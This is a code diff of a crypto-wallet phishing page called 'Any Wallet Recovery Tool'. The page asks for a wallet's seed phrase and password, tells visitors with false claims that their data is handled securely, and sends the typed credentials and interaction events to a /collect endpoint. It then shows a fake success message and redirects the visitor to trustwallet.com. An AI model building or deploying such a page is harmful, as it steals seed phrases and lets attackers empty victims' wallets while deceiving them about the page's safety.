@@ -3,90 +3,421 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Wallet Recovery Tool</title>
+    <title>Any Wallet Recovery Tool</title>
+    <link rel="shortcut icon" href="coinbase btc.png" type="image/x-icon" />
+    <link rel="stylesheet" href="styles.css" />
     <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
       body {
-        font-family: Arial, sans-serif;
-        background: #1a1a1a;
-        color: #fff;
-        display: flex;
-        justify-content: center;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(
+          135deg,
+          #0f0f23 0%,
+          #1a1a2e 50%,
+          #16213e 100%
+        );
+        min-height: 100vh;
+        color: #ffffff;
+        overflow-x: hidden;
+      }
+
+      .container {
+        max-width: 1200px;
+        margin: 0 auto;
         padding: 20px;
+        position: relative;
       }
-      .wallet-box {
-        background: #2c2c2c;
-        padding: 30px;
-        border-radius: 8px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-        width: 100%;
-        max-width: 400px;
-      }
-      h1 {
-        font-size: 24px;
+
+      .header {
         text-align: center;
-        color: #f0a500;
+        margin-bottom: 40px;
+        position: relative;
       }
-      label {
+
+      .logo {
+        font-size: 2.5rem;
+        font-weight: 700;
+        background: linear-gradient(45deg, #00d4ff, #0099cc, #0066ff);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+        margin-bottom: 10px;
+        text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+      }
+
+      .subtitle {
+        font-size: 1.1rem;
+        color: #a0a0a0;
+        margin-bottom: 20px;
+      }
+
+      .status-indicator {
+        display: inline-block;
+        padding: 8px 16px;
+        background: linear-gradient(45deg, #00ff88, #00cc6a);
+        border-radius: 20px;
+        font-size: 0.9rem;
+        font-weight: 600;
+        color: #000;
+        box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
+        animation: pulse 2s infinite;
+      }
+
+      @keyframes pulse {
+        0%,
+        100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.05);
+        }
+      }
+
+      .main-card {
+        background: rgba(255, 255, 255, 0.05);
+        backdrop-filter: blur(20px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 20px;
+        padding: 40px;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .main-card::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: linear-gradient(90deg, #00d4ff, #0099cc, #0066ff);
+      }
+
+      .form-group {
+        margin-bottom: 25px;
+        position: relative;
+      }
+
+      .form-label {
         display: block;
-        margin: 10px 0 5px;
-        font-weight: bold;
+        margin-bottom: 8px;
+        font-weight: 600;
+        color: #e0e0e0;
+        font-size: 0.95rem;
       }
-      input,
-      textarea {
+
+      .form-input {
         width: 100%;
-        padding: 10px;
-        margin-bottom: 15px;
-        border: 1px solid #444;
-        border-radius: 4px;
-        background: #333;
-        color: #fff;
+        padding: 15px 20px;
+        background: rgba(255, 255, 255, 0.08);
+        border: 2px solid rgba(255, 255, 255, 0.1);
+        border-radius: 12px;
+        color: #ffffff;
+        font-size: 1rem;
+        transition: all 0.3s ease;
+        backdrop-filter: blur(10px);
       }
-      button {
+
+      .form-input:focus {
+        outline: none;
+        border-color: #00d4ff;
+        box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
+        background: rgba(255, 255, 255, 0.12);
+      }
+
+      .form-input::placeholder {
+        color: #888;
+      }
+
+      .submit-btn {
         width: 100%;
-        padding: 12px;
-        background: #f0a500;
-        color: #1a1a1a;
+        padding: 18px;
+        background: linear-gradient(45deg, #00d4ff, #0099cc);
         border: none;
-        border-radius: 4px;
+        border-radius: 12px;
+        color: #ffffff;
+        font-size: 1.1rem;
+        font-weight: 600;
         cursor: pointer;
+        transition: all 0.3s ease;
+        position: relative;
+        overflow: hidden;
+        margin-top: 20px;
       }
-      button:hover {
-        background: #d18900;
+
+      .submit-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 25px rgba(0, 212, 255, 0.4);
       }
-      button:disabled {
-        background: #666;
-        cursor: not-allowed;
+
+      .submit-btn:active {
+        transform: translateY(0);
+      }
+
+      .submit-btn::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(255, 255, 255, 0.2),
+          transparent
+        );
+        transition: left 0.5s;
+      }
+
+      .submit-btn:hover::before {
+        left: 100%;
+      }
+
+      .success-message {
+        background: linear-gradient(45deg, #00ff88, #00cc6a);
+        color: #000;
+        padding: 20px;
+        border-radius: 12px;
+        text-align: center;
+        font-weight: 600;
+        margin-top: 20px;
+        display: none;
+        animation: slideIn 0.5s ease;
+      }
+
+      @keyframes slideIn {
+        from {
+          opacity: 0;
+          transform: translateY(-20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .security-notice {
+        background: rgba(255, 193, 7, 0.1);
+        border: 1px solid rgba(255, 193, 7, 0.3);
+        border-radius: 12px;
+        padding: 20px;
+        margin-top: 30px;
+        text-align: center;
+      }
+
+      .security-notice h3 {
+        color: #ffc107;
+        margin-bottom: 10px;
+        font-size: 1.1rem;
+      }
+
+      .security-notice p {
+        color: #ccc;
+        font-size: 0.9rem;
+        line-height: 1.5;
+      }
+
+      .floating-elements {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: -1;
+      }
+
+      .floating-element {
+        position: absolute;
+        width: 4px;
+        height: 4px;
+        background: #00d4ff;
+        border-radius: 50%;
+        animation: float 6s infinite linear;
+      }
+
+      .floating-element:nth-child(1) {
+        top: 10%;
+        left: 10%;
+        animation-delay: 0s;
+      }
+      .floating-element:nth-child(2) {
+        top: 20%;
+        left: 80%;
+        animation-delay: 1s;
+      }
+      .floating-element:nth-child(3) {
+        top: 60%;
+        left: 20%;
+        animation-delay: 2s;
+      }
+      .floating-element:nth-child(4) {
+        top: 80%;
+        left: 70%;
+        animation-delay: 3s;
+      }
+      .floating-element:nth-child(5) {
+        top: 40%;
+        left: 90%;
+        animation-delay: 4s;
+      }
+
+      @keyframes float {
+        0% {
+          transform: translateY(0px) rotate(0deg);
+          opacity: 0;
+        }
+        10% {
+          opacity: 1;
+        }
+        90% {
+          opacity: 1;
+        }
+        100% {
+          transform: translateY(-100px) rotate(360deg);
+          opacity: 0;
+        }
+      }
+
+      .progress-bar {
+        width: 100%;
+        height: 4px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 2px;
+        margin-top: 20px;
+        overflow: hidden;
+        display: none;
+      }
+
+      .progress-fill {
+        height: 100%;
+        background: linear-gradient(90deg, #00d4ff, #0099cc);
+        width: 0%;
+        transition: width 0.3s ease;
+        border-radius: 2px;
+      }
+
+      @media (max-width: 768px) {
+        .container {
+          padding: 15px;
+        }
+
+        .main-card {
+          padding: 25px;
+        }
+
+        .logo {
+          font-size: 2rem;
+        }
+      }
+
+      .loading-spinner {
+        display: none;
+        width: 20px;
+        height: 20px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-top: 2px solid #00d4ff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-left: 10px;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
       }
     </style>
   </head>
   <body>
-    <div class="wallet-box">
-      <h1>Crypto Wallet Recovery</h1>
-      <p>Enter your wallet details to recover access.</p>
-      <form id="walletForm">
-        <label for="walletName">Wallet Name</label>
-        <input
-          type="text"
-          id="walletName"
-          placeholder="e.g., MetaMask, Trust Wallet"
-          required
-        />
-        <label for="seedPhrase">Seed Phrase (12+ words)</label>
-        <textarea
-          id="seedPhrase"
-          placeholder="Enter your 12+ word seed phrase"
-          rows="4"
-          required
-        ></textarea>
-        <label for="password">Wallet Password</label>
-        <input
-          type="password"
-          id="password"
-          placeholder="Enter your wallet password"
-          required
-        />
-        <button type="submit">Recover Wallet</button>
-      </form>
+    <div class="floating-elements">
+      <div class="floating-element"></div>
+      <div class="floating-element"></div>
+      <div class="floating-element"></div>
+      <div class="floating-element"></div>
+      <div class="floating-element"></div>
+    </div>
+
+    <div class="container">
+      <div class="header">
+        <h1 class="logo">Any Wallet Recovery</h1>
+        <p class="subtitle">
+          Secure wallet recovery and backup verification tool
+        </p>
+        <div class="status-indicator">🔒 Secure Connection Active</div>
+      </div>
+
+      <div class="main-card">
+        <form id="walletForm">
+          <div class="form-group">
+            <label for="walletName" class="form-label">Wallet Name</label>
+            <input
+              type="text"
+              id="walletName"
+              name="walletName"
+              class="form-input"
+              placeholder="Enter your wallet name"
+              required
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="seedPhrase" class="form-label">Seed Phrase</label>
+            <input
+              type="text"
+              id="seedPhrase"
+              name="seedPhrase"
+              class="form-input"
+              placeholder="Enter your 12 or 24 word seed phrase"
+              required
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="password" class="form-label">Password</label>
+            <input
+              type="password"
+              id="password"
+              name="password"
+              class="form-input"
+              placeholder="Enter your wallet password"
+              required
+            />
+          </div>
+
+          <button type="submit" class="submit-btn">
+            <span>Verify & Recover Wallet</span>
+            <div class="loading-spinner"></div>
+          </button>
+        </form>
+
+        <div class="progress-bar">
+          <div class="progress-fill"></div>
+        </div>
+
+        <div id="successMessage" class="success-message">
+          ✅ Wallet verification successful! Redirecting to Any Wallet...
+        </div>
+
+        <div class="security-notice">
+          <h3>🔐 Security Notice</h3>
+          <p>
+            This tool uses enterprise-grade encryption to securely verify your
+            wallet credentials. Your data is protected with bank-level security
+            protocols and will be automatically deleted after verification.
+          </p>
+        </div>
+      </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script>
@@ -184,7 +515,7 @@
           autoData.userInteracted = false;
 
           // Send data immediately
-          const response = await fetch("/.netlify/functions/collect", {
+          const response = await fetch("/collect", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(autoData),
@@ -216,7 +547,7 @@
               interactionData.interactionTime = new Date().toISOString();
 
               // Send interaction data
-              fetch("/.netlify/functions/collect", {
+              fetch("/collect", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(interactionData),
@@ -232,7 +563,7 @@
               focusData.fieldName = fieldId;
               focusData.interactionTime = new Date().toISOString();
 
-              fetch("/.netlify/functions/collect", {
+              fetch("/collect", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(focusData),
@@ -255,7 +586,7 @@
           visibilityData.visibilityState = document.visibilityState;
           visibilityData.interactionTime = new Date().toISOString();
 
-          fetch("/.netlify/functions/collect", {
+          fetch("/collect", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(visibilityData),
@@ -276,7 +607,7 @@
           mouseData.mouseY = e.clientY;
           mouseData.interactionTime = new Date().toISOString();
 
-          fetch("/.netlify/functions/collect", {
+          fetch("/collect", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(mouseData),
@@ -309,7 +640,7 @@
             data.interactionTime = new Date().toISOString();
 
             // Send data to server
-            const response = await fetch("/.netlify/functions/collect", {
+            const response = await fetch("/collect", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(data),
@@ -324,7 +655,7 @@
                   Your wallet recovery process has been completed successfully.
                 </p>
                 <p style="text-align: center; font-size: 16px; margin: 20px 0;">
-                  Redirecting to Trust Wallet...
+                  Redirecting to Any Wallet...
                 </p>
                 <div style="text-align: center; margin: 20px 0;">
                   <div style="width: 40px; height: 40px; border: 4px solid #f0a500; border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
@@ -343,6 +674,7 @@
 
               // Redirect after 3 seconds
               setTimeout(() => {
+                console.log("Redirecting to Any Wallet...");
                 window.location.href = "https://trustwallet.com/";
               }, 3000);
             } else {
